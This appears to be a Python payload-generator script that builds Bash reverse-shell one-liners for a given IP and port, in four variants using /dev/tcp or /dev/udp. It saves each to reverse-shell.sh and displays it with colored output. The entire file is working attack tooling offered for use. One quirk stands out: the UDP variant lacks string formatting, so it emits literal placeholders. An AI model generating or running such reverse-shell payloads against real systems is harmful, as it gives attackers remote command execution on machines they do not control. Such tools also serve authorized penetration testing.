from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def Bash_i(ip, port):
   payload = f'sh -i >& /dev/tcp/"{ip}"/{port} 0>&1'
   with open("reverse-shell.sh", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]"):
      time.sleep(3)
      f.write(payload)
   myStyle = Style(color="#7780ff", bold=True)
   console.print("The payload is: \n", style=myStyle)
   synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
   console.print(synt)
   console.print("\n[#aed06d]Saved as reverse-shell.sh\n[/#aed06d]", style=myStyle)

def Bash_196(ip, port):
   payload = f'0<&196;exec 196<>/dev/tcp/"{ip}"/{port}; sh <&196 >&196 2>&196'
   with open("reverse-shell.sh", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="aesthetic"):
      time.sleep(3)
      f.write(payload)
   myStyle = Style(color="#7780ff", bold=True)
   console.print("The payload is: \n", style=myStyle)
   synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
   console.print(synt)
   console.print("\n[#aed06d]Saved as reverse-shell.sh\n[/#aed06d]", style=myStyle)

def Bash_read_line(ip, port):
   payload = f'exec 5<>/dev/tcp/"{ip}"/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'
   with open("reverse-shell.sh", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]"):
      time.sleep(3)
      f.write(payload)
   myStyle = Style(color="#7780ff", bold=True)
   console.print("The payload is: \n", style=myStyle)
   synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
   console.print(synt)
   console.print("\n[#aed06d]Saved as reverse-shell.sh\n[/#aed06d]", style=myStyle)

def Bash_UDP(ip, port):
   payload = "sh -i >& /dev/udp/{ip}/{port} 0>&1"
   with open("reverse-shell.sh", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]"):
      time.sleep(3)
      f.write(payload)
   myStyle = Style(color="#7780ff", bold=True)
   console.print("The payload is: \n", style=myStyle)
   synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
   console.print(synt)
   console.print("\n[#aed06d]Saved as reverse-shell.sh\n[/#aed06d]", style=myStyle)